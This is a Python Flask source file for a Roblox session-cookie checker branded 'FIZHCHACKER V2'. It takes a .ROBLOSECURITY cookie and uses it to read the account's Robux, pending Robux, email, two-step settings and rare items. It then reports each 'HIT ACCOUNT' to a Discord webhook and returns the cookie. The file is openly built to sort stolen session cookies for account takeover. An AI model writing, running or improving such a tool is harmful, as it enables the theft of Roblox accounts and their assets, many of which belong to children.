from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/check', methods=['POST'])
def api_check():
    cookie = request.form.get('cookie', '').strip()
    webhook_url = request.form.get('webhook_url', '').strip()

    if not cookie:
        return jsonify({'result': {'status': 'invalid'}})

    cookies = {'.ROBLOSECURITY': cookie}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': 'https://www.roblox.com/'
    }

    try:
        # 1. Validasi Autentikasi User
        user_res = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies, headers=headers)
        if user_res.status_code != 200:
            return jsonify({'result': {'status': 'invalid'}})
        
        user_data = user_res.json()
        user_id = user_data.get('id')
        username = user_data.get('name')
        display_name = user_data.get('displayName')

        # 2. Ambil Avatar
        avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false"
        headshot_res = requests.get(avatar_url, headers=headers)
        if headshot_res.status_code == 200:
            hs_data = headshot_res.json().get('data', [])
            if hs_data:
                avatar_url = hs_data[0].get('imageUrl', '')

        model_3d_url = f"https://www.roblox.com/users/{user_id}/profile"

        # 3. Saldo Robux & Pending Robux
        economy_res = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', cookies=cookies, headers=headers)
        robux = economy_res.json().get('robux', 0) if economy_res.status_code == 200 else 0

        pending_robux = 0
        trans_res = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary', cookies=cookies, headers=headers)
        if trans_res.status_code == 200:
            trans_data = trans_res.json()
            pending_robux = trans_data.get('pendingRobuxTotal', 0)

        rap = 0 
        saved_payment = "None Detected"

        # 4. Status Keamanan
        settings_res = requests.get('https://accountsettings.roblox.com/v1/email', cookies=cookies, headers=headers)
        email_status = "Unverified"
        if settings_res.status_code == 200:
            email_data = settings_res.json()
            if email_data.get('verified'):
                email_addr = email_data.get('emailAddress', '')
                email_status = f"Verified ({email_addr[:3]}***)" if email_addr else "Verified"

        two_step_res = requests.get(f'https://twostepverification.roblox.com/v1/users/{user_id}/settings', cookies=cookies, headers=headers)
        has_a2f = False
        if two_step_res.status_code == 200:
            ts_data = two_step_res.json()
            has_a2f = any(ts_data.get(k, False) for k in ['isAuthenticatorEnabled', 'isEmailEnabled', 'isSmsEnabled'])

        # 5. Cek Item & Icon Katalog (Headless, Korblox, VFX, Limited)
        def check_item_owned(asset_id):
            inv = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/asset/{asset_id}', cookies=cookies, headers=headers)
            if inv.status_code == 200:
                data_inv = inv.json().get('data', [])
                return len(data_inv) > 0
            return False

        def get_asset_icon(asset_id):
            t_res = requests.get(f'https://thumbnails.roblox.com/v1/assets?assetIds={asset_id}&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false', headers=headers)
            if t_res.status_code == 200:
                t_data = t_res.json().get('data', [])
                if t_data:
                    return t_data[0].get('imageUrl', '')
            return "https://tr.rbxcdn.com/3941584c7f041d8e13fcd779b5b15df3/150/150/Image/Png"

        headless_owned = check_item_owned(134082579)
        korblox_owned = check_item_owned(139607718)
        vfx_owned = check_item_owned(98436573)
        limited_owned = check_item_owned(45484837)

        animations = [
            {"name": "Mage Animation Pack", "icon": get_asset_icon(106753330)}
        ]

        headless_data = {"name": "Headless Horseman", "status": headless_owned, "icon": get_asset_icon(134082579)}
        korblox_data = {"name": "Korblox Deathspeaker", "status": korblox_owned, "icon": get_asset_icon(139607718)}
        vfx_data = {"name": "VFX / Particle Effect", "status": vfx_owned, "icon": get_asset_icon(98436573)}
        limited_data = {"name": "Limited Collectible", "status": limited_owned, "icon": get_asset_icon(45484837)}

        # 6. Riwayat Game & Spent Map
        game_spent = []
        game_history = []

        games_res = requests.get(f'https://games.roblox.com/v1/users/{user_id}/games?limit=5', headers=headers)
        if games_res.status_code == 200:
            games_data = games_res.json().get('data', [])
            for g in games_data[:3]:
                universe_id = g.get('id')
                g_name = g.get('name')
                
                icon_res = requests.get(f'https://thumbnails.roblox.com/v1/games/icons?universeIds={universe_id}&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false', headers=headers)
                g_icon = "https://tr.rbxcdn.com/3941584c7f041d8e13fcd779b5b15df3/150/150/Image/Png"
                if icon_res.status_code == 200:
                    icon_data = icon_res.json().get('data', [])
                    if icon_data:
                        g_icon = icon_data[0].get('imageUrl', g_icon)

                game_history.append({"name": g_name, "icon": g_icon})
                game_spent.append({"name": g_name, "icon": g_icon, "spent": "0"})

        if not game_history:
            game_history.append({"name": "No Recent Games", "icon": avatar_url})
            game_spent.append({"name": "No In-Game Data", "icon": avatar_url, "spent": "0"})

        # Webhook Discord
        if webhook_url:
            discord_payload = {
                "content": f"🚨 **FIZHCHACKER V2 - HIT ACCOUNT**\n👤 User: `{username}`\n💰 Robux: `{robux}` (Pending: `{pending_robux}`)\n💀 Headless: `{headless_owned}` | Korblox: `{korblox_owned}` | VFX: `{vfx_owned}`"
            }
            requests.post(webhook_url, json=discord_payload)

        return jsonify({
            "result": {
                "status": "valid",
                "id": user_id,
                "username": username,
                "display_name": display_name,
                "avatar_url": avatar_url,
                "model_3d_url": model_3d_url,
                "robux": robux,
                "pending_robux": pending_robux,
                "rap": rap,
                "saved_payment": saved_payment,
                "email_status": email_status,
                "has_a2f": has_a2f,
                "refreshed_cookie": cookie,
                "animations": animations,
                "headless": headless_data,
                "korblox": korblox_data,
                "vfx": vfx_data,
                "limited": limited_data,
                "game_spent": game_spent,
                "game_history": game_history
            }
        })

    except Exception as e:
        return jsonify({'result': {'status': 'invalid'}})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
